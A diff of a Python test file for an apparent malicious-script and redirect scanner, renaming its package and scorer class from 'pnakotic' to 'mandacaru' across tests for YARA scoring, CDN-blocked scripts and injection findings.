     (tmp_path / "r" / "js_ext_test_001.yara").write_text(
@@ -1307,8 +1307,8 @@ async def test_yara_matches_an_ad_frame_without_deciding(local_site, tmp_path, y
 
 def test_scoring_yara_tiers():
     import json as _json
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import RedirectHop, ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import RedirectHop, ScanResult
 
     def hit(rule, severity, production):
         return RedirectHop(url="https://x.example/a.js", mechanism="yara_match", evidence=_json.dumps(
@@ -1318,7 +1318,7 @@ def test_scoring_yara_tiers():
     def score(*hops):
         r = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
         r.hops = list(hops)
-        return PnakoticScorer().score(r), r
+        return MandacaruScorer().score(r), r
 
     assert score(hit("a", 2, True), hit("b", 1, False))[0] == pytest.approx(0.15)  # weak, once
     assert score(hit("a", 5, False), hit("b", 3, True))[0] == pytest.approx(0.4)   # strong, once
@@ -1345,13 +1345,13 @@ async def test_self_reload_is_not_a_redirect(local_site, tmp_path):
 
 
 def test_notification_prompt_after_the_click_probe_is_not_weighted():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import ScanResult
 
     def score(trigger):
         r = ScanResult(target_url="https://x.example/", final_url="https://x.example/")
         r.hops = [_behavior_hop(id="notification_request", trigger=trigger)]
-        return PnakoticScorer().score(r), r.metadata["scoring_findings"]
+        return MandacaruScorer().score(r), r.metadata["scoring_findings"]
 
     assert score("load")[0] == pytest.approx(0.2)
     total, findings = score("click")
@@ -1360,7 +1360,7 @@ def test_notification_prompt_after_the_click_probe_is_not_weighted():
 
 @pytest.mark.asyncio
 async def test_script_collector_records_scripts_blocked_as_malware_by_the_cdn():
-    from pnakotic.src.scanner.yara_scan import MAX_FLAGGED, ScriptCollector
+    from mandacaru.src.scanner.yara_scan import MAX_FLAGGED, ScriptCollector
 
     class Req:
         resource_type = "script"
@@ -1394,7 +1394,7 @@ async def test_script_collector_records_scripts_blocked_as_malware_by_the_cdn():
 
 @pytest.mark.asyncio
 async def test_script_collector_refetches_orb_dropped_scripts_through_the_context():
-    from pnakotic.src.scanner.yara_scan import MAX_PROBES, PROBE_MAX_BYTES, ScriptCollector
+    from mandacaru.src.scanner.yara_scan import MAX_PROBES, PROBE_MAX_BYTES, ScriptCollector
 
     interstitial = (b"<html><head><title>Suspected Malware | Cloudflare</title></head><body>"
                     b"This website has been reported for potentially distributing malware.</body></html>")
@@ -1492,8 +1492,8 @@ def test_scoring_obfuscated_injection_from_the_pages_own_code():
 
 
 def test_scoring_flagged_and_injection_also_count_in_site_mode():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import ScanResult
 
     r = ScanResult(target_url="https://s.com/p", final_url="https://www.s.com/p")
     r.metadata = {"page_signals": _NO_SIGNALS,
@@ -1501,19 +1501,19 @@ def test_scoring_flagged_and_injection_also_count_in_site_mode():
                   "injections": [{"requested_url": "https://r1.example/donation", "initiator_kind": "inline",
                                   "initiator_url": "https://www.s.com/p", "block": None, "markers": [],
                                   "body_markers": ["hex_identifier_density"], "context": None}]}
-    assert PnakoticScorer().score(r, site_host="www.s.com") == pytest.approx(0.8)
+    assert MandacaruScorer().score(r, site_host="www.s.com") == pytest.approx(0.8)
 
 
 def test_runtime_code_with_markers_is_an_unweighted_finding():
-    from pnakotic.src.intelligence.scorer import PnakoticScorer
-    from pnakotic.src.scanner.models import ScanResult
+    from mandacaru.src.intelligence.scorer import MandacaruScorer
+    from mandacaru.src.scanner.models import ScanResult
 
     def scored(stages):
         result = ScanResult(target_url="https://shop.com/", final_url="https://shop.com/")
         result.metadata = {"page_signals": {"title": "Shop"}}
         if stages is not None:
             result.metadata["eval_stages"] = stages
-        return PnakoticScorer().score(result), result.metadata["scoring_findings"]
+        return MandacaruScorer().score(result), result.metadata["scoring_findings"]
 
     base, base_findings = scored(None)
     stage = {"caller": "", "caller_line": None, "length": 9, "markers": ["hex_identifier_density"],
